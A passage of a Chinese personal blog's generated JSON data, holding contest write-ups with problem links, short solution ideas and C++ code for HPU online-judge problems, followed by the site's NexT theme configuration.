class=\"line\">\ty&#x3D;min(a[1][1],b[1][1])-max(a[0][1],b[0][1]);</span><br><span class=\"line\">\tint s&#x3D;(a[1][1]-a[0][1])*(a[1][0]-a[0][0])+(b[1][1]-b[0][1])*(b[1][0]-b[0][0]);</span><br><span class=\"line\">\tif(x*y&gt;0)s-&#x3D;x*y;</span><br><span class=\"line\">\tcout&lt;&lt;s&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"I-安全距离\"><a href=\"#I-安全距离\" class=\"headerlink\" title=\"I.安全距离\"></a>I.安全距离</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/I/\">https://hpuoj.com/contest/16/problem/I/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"J-简单递归\"><a href=\"#J-简单递归\" class=\"headerlink\" title=\"J.简单递归\"></a>J.简单递归</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/J/\">https://hpuoj.com/contest/16/problem/J/</a><br>思路: 讲题目代码递归转化为非递归即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">const int MOD &#x3D; (int)1e9 + 7;</span><br><span class=\"line\">int a[1000020];</span><br><span class=\"line\">void init()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\ta[1]&#x3D;a[2]&#x3D;1;</span><br><span class=\"line\">\tfor(int i&#x3D;3;i&lt;&#x3D;1000000;i++)</span><br><span class=\"line\">\t\ta[i]&#x3D;((a[i-1]&lt;&lt;1)%MOD+(a[i-2]&gt;&gt;1)%MOD)%MOD;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tint T,N;</span><br><span class=\"line\">\tcin&gt;&gt;T;</span><br><span class=\"line\">\twhile(T--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcin&gt;&gt;N;</span><br><span class=\"line\">\t\tcout&lt;&lt;a[N]&lt;&lt;endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"K-高度期望\"><a href=\"#K-高度期望\" class=\"headerlink\" title=\"K.高度期望\"></a>K.高度期望</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/K/\">https://hpuoj.com/contest/16/problem/K/</a><br>思路: 贪心求解,先对树高进行排序,再从低到高遍历即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,M,a[100020];</span><br><span class=\"line\">\tll ans&#x3D;0,res&#x3D;0;</span><br><span class=\"line\">\tcin&gt;&gt;N&gt;&gt;M;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcin&gt;&gt;a[i];</span><br><span class=\"line\">\t\tans+&#x3D;a[i];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsort(a,a+N);</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(ans&gt;&#x3D;M*N)break;</span><br><span class=\"line\">\t\tans+&#x3D;1000-a[i];</span><br><span class=\"line\">\t\tres++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;res&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"L-最优规划\"><a href=\"#L-最优规划\" class=\"headerlink\" title=\"L.最优规划\"></a>L.最优规划</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/L/\">https://hpuoj.com/contest/16/problem/L/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":6325,"excerpt":"<h1 id=\"热身赛\"><a href=\"#热身赛\" class=\"headerlink\" title=\"热身赛\"></a>热身赛</h1><h2 id=\"A-三玖天下第一\"><a href=\"#A-三玖天下第一\" class=\"headerlink\" title=\"A.三玖天下第一\"></a>A.三玖天下第一</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/18/problem/A/\">https://hpuoj.com/contest/18/problem/A/</a><br>思路: 很水的一道题, $map$ 统计出现次数最多的数字,判断一下输出就行了.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstring s;</span><br><span class=\"line\">\tmap&lt;char,int&gt;M;</span><br><span class=\"line\">\tcin&gt;&gt;s;</span><br><span class=\"line\">\tint ans&#x3D;0;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;s.length();i++)</span><br><span class=\"line\">\t\tM[s[i]]++;</span><br><span class=\"line\">\tfor(int i&#x3D;&#39;0&#39;;i&lt;&#x3D;&#39;9&#39;;i++)</span><br><span class=\"line\">\t\tif(M[i]&gt;M[ans])ans&#x3D;i;</span><br><span class=\"line\">\tif(ans&#x3D;&#x3D;&#39;0&#39;)cout&lt;&lt;&quot;Five equal parts.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;1&#39;)cout&lt;&lt;&quot;One flower gathers people.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;2&#39;)cout&lt;&lt;&quot;The second is very color.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;3&#39;)cout&lt;&lt;&quot;San Jiu tian xia di yi!&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse if(ans&#x3D;&#x3D;&#39;4&#39;)cout&lt;&lt;&quot;Four leaves kawaii.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\telse cout&lt;&lt;&quot;May daughter.&quot;&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>","more":"<h2 id=\"B-权力的游戏\"><a href=\"#B-权力的游戏\" class=\"headerlink\" title=\"B.权力的游戏\"></a>B.权力的游戏</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/18/problem/B/\">https://hpuoj.com/contest/18/problem/B/</a><br>思路: 仍旧是 $map$ 统计每个数字出现次数,出现次数为奇数的输出一下就行了.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,flag&#x3D;0;</span><br><span class=\"line\">\tmap&lt;int,int&gt;M;</span><br><span class=\"line\">\twhile(cin&gt;&gt;N)M[N]++;</span><br><span class=\"line\">\tmap&lt;int,int&gt;::iterator it;</span><br><span class=\"line\">\tfor(it&#x3D;M.begin();it!&#x3D;M.end();it++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(it-&gt;second%2)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif(flag&#x3D;&#x3D;0)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcout&lt;&lt;it-&gt;first;</span><br><span class=\"line\">\t\t\t\tflag&#x3D;1;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\telse cout&lt;&lt;&#39; &#39;&lt;&lt;it-&gt;first;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"正式赛\"><a href=\"#正式赛\" class=\"headerlink\" title=\"正式赛\"></a>正式赛</h1><h2 id=\"A-Asia区域赛\"><a href=\"#A-Asia区域赛\" class=\"headerlink\" title=\"A.Asia区域赛\"></a>A.Asia区域赛</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/A/\">https://hpuoj.com/contest/16/problem/A/</a><br>思路: 大水题一个,计算奖牌个数=29金+59银+87铜+11最快解题+1最佳女队+1顽强拼搏=187个,输出187即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tcout&lt;&lt;187&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"B-Asia区域制\"><a href=\"#B-Asia区域制\" class=\"headerlink\" title=\"B.Asia区域制\"></a>B.Asia区域制</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/B/\">https://hpuoj.com/contest/16/problem/B/</a><br>思路: 二进制转十六进制,每四位转化一下输出即可,注意要先转化前面不足四位的.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">char x[20]&#x3D;&quot;0123456789abcdef&quot;;</span><br><span class=\"line\">string s;</span><br><span class=\"line\">int POW(int a,int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint ans&#x3D;1;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;b;i++)</span><br><span class=\"line\">\t\tans*&#x3D;a;</span><br><span class=\"line\">\treturn ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint T,l,ans;</span><br><span class=\"line\">\tcin&gt;&gt;T;</span><br><span class=\"line\">\twhile(T--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tans&#x3D;0;</span><br><span class=\"line\">\t\tcin&gt;&gt;s;</span><br><span class=\"line\">\t\tl&#x3D;s.length();</span><br><span class=\"line\">\t\tfor(int i&#x3D;l%4-1;i&gt;&#x3D;0;i--)</span><br><span class=\"line\">\t\t\tif(s[i]&#x3D;&#x3D;&#39;1&#39;)</span><br><span class=\"line\">\t\t\tans+&#x3D;POW(2,l%4-i-1);</span><br><span class=\"line\">\t\tif(l%4)cout&lt;&lt;x[ans];</span><br><span class=\"line\">\t\tfor(int i&#x3D;l%4;i&lt;l;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tans&#x3D;0;</span><br><span class=\"line\">\t\t\tfor(int j&#x3D;0;j&lt;4;j++)</span><br><span class=\"line\">\t\t\t\tif(s[i+j]&#x3D;&#x3D;&#39;1&#39;)</span><br><span class=\"line\">\t\t\t\tans+&#x3D;POW(2,3-j);</span><br><span class=\"line\">\t\t\tcout&lt;&lt;x[ans];</span><br><span class=\"line\">\t\t\ti+&#x3D;3;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tcout&lt;&lt;endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"C-Asia区域宫\"><a href=\"#C-Asia区域宫\" class=\"headerlink\" title=\"C.Asia区域宫\"></a>C.Asia区域宫</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/C/\">https://hpuoj.com/contest/16/problem/C/</a><br>思路: 注意加粗字体 <strong>“障碍物在迷宫中不能同行且不能同列”</strong>,说明只有把与副对角线平行的路线堵死之后才输出 No ,其余情况输出皆为 2*$n$-2.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"D-Asia区域阵\"><a href=\"#D-Asia区域阵\" class=\"headerlink\" title=\"D.Asia区域阵\"></a>D.Asia区域阵</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/D/\">https://hpuoj.com/contest/16/problem/D/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"E-Mo的游戏\"><a href=\"#E-Mo的游戏\" class=\"headerlink\" title=\"E.Mo的游戏\"></a>E.Mo的游戏</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/E/\">https://hpuoj.com/contest/16/problem/E/</a><br>思路: $map$记录相同字符之间的最短距离,建一个数组记录此字符上次出现的位置.for循环遍历一遍即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int a[200];</span><br><span class=\"line\">int M[200];</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstring s;</span><br><span class=\"line\">\tmemset(M,-1,sizeof(M));</span><br><span class=\"line\">\tcin&gt;&gt;s;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;s.length();i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(M[s[i]]&#x3D;&#x3D;-1)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tM[s[i]]++;</span><br><span class=\"line\">\t\t\ta[s[i]]&#x3D;i+1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif(M[s[i]]&#x3D;&#x3D;0)M[s[i]]&#x3D;i+1-a[s[i]];</span><br><span class=\"line\">\t\t\tif(i+1-a[s[i]]&lt;M[s[i]])</span><br><span class=\"line\">\t\t\t\tM[s[i]]&#x3D;i+1-a[s[i]];</span><br><span class=\"line\">\t\t\ta[s[i]]&#x3D;i+1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfor(char i&#x3D;&#39;a&#39;;i&lt;&#x3D;&#39;z&#39;;i++)</span><br><span class=\"line\">\t\tif(M[i]&#x3D;&#x3D;0)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;0&lt;&lt;endl;</span><br><span class=\"line\">\t\telse if(M[i]!&#x3D;-1)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;s.length()-M[i]&lt;&lt;endl;</span><br><span class=\"line\">\tfor(char i&#x3D;&#39;A&#39;;i&lt;&#x3D;&#39;Z&#39;;i++)</span><br><span class=\"line\">\t\tif(M[i]&#x3D;&#x3D;0)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;0&lt;&lt;endl;</span><br><span class=\"line\">\t\telse if(M[i]!&#x3D;-1)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;s.length()-M[i]&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"F-Mo的极限\"><a href=\"#F-Mo的极限\" class=\"headerlink\" title=\"F.Mo的极限\"></a>F.Mo的极限</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/F/\">https://hpuoj.com/contest/16/problem/F/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"G-Mo的数学\"><a href=\"#G-Mo的数学\" class=\"headerlink\" 